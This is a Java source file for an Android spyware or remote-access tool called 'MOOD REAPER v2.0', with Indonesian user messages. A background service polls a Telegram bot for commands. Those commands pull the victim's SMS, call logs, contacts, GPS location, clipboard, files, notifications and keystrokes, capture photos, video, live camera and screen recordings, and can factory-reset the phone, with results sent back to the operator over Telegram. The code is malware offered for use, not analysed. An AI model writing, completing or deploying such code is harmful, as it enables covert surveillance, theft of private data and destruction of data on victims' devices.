package com.mood.reaper;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import com.google.gson.JsonParser;
import okhttp3.*;
import org.json.JSONObject;

public class CommandHandler extends Service {
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    private OkHttpClient client = new OkHttpClient();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            int lastUpdateId = 0;
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
                    Response res = client.newCall(new Request.Builder().url(url).build()).execute();
                    String json = res.body().string();
                    JSONObject obj = new JSONObject(json);

                    if (obj.getBoolean("ok")) {
                        for (Object o : obj.getJSONArray("result")) {
                            JSONObject update = (JSONObject) o;
                            lastUpdateId = update.getInt("update_id");
                            String text = update.getJSONObject("message").getString("text");
                            processCommand(text);
                        }
                    }
                    Thread.sleep(2000);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
        return START_STICKY;
    }

    private void processCommand(String cmd) {
        switch (cmd) {
            case "/help": sendHelp(); break;
            case "/sms": Utils.sendSMSLogs(this); break;
            case "/calls": Utils.sendCallLogs(this); break;
            case "/contacts": Utils.sendContacts(this); break;
            case "/location": Utils.sendLocation(this); break;
            case "/photo": Utils.takePhoto(this); break;
            case "/video": Utils.recordVideo(this); break;
            case "/camera_stream": new CameraHack().startStream(); break;
            case "/screen": Utils.startScreenRecording(this); break;
            case "/files": Utils.listFiles(this); break;
            case "/clipboard": Utils.getClipboard(this); break;
            case "/apps": Utils.listApps(this); break;
            case "/device": Utils.sendDeviceInfo(this); break;
            case "/wifi": Utils.scanWifi(this); break;
            case "/sim": Utils.sendSimInfo(this); break;
            case "/notif": startNotificationListener(); break;
            case "/reset": Utils.factoryReset(this); break;
            case "/keylog": startKeylogger(); break;
            default: Utils.sendToTelegram("❌ Perintah gak dikenal. Ketik /help");
        }
    }

    private void sendHelp() {
        String help = 
            "💀 MOOD REAPER v2.0 COMMANDS\n" +
            "─────────────────────\n" +
            "/keylog - Rekam ketikan\n" +
            "/sms - Ambil SMS\n" +
            "/calls - Riwayat panggilan\n" +
            "/contacts - Daftar kontak\n" +
            "/location - GPS realtime\n" +
            "/photo - Foto kamera\n" +
            "/video - Video 10 detik\n" +
            "/camera_stream - Streaming kamera\n" +
            "/screen - Rekam layar\n" +
            "/files - List file storage\n" +
            "/clipboard - Ambil clipboard\n" +
            "/apps - Aplikasi terinstall\n" +
            "/device - Info perangkat\n" +
            "/wifi - Scan WiFi\n" +
            "/sim - Info SIM\n" +
            "/notif - Forward notifikasi\n" +
            "/reset - Factory reset (⚠️)\n" +
            "/help - Menu ini";
        Utils.sendToTelegram(help);
    }

    private void startKeylogger() { Utils.sendToTelegram("⌨️ Keylogger aktif"); }
    private void startNotificationListener() { 
        startService(new Intent(this, NotificationCatcher.class));
        Utils.sendToTelegram("🔔 Notification listener aktif");
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}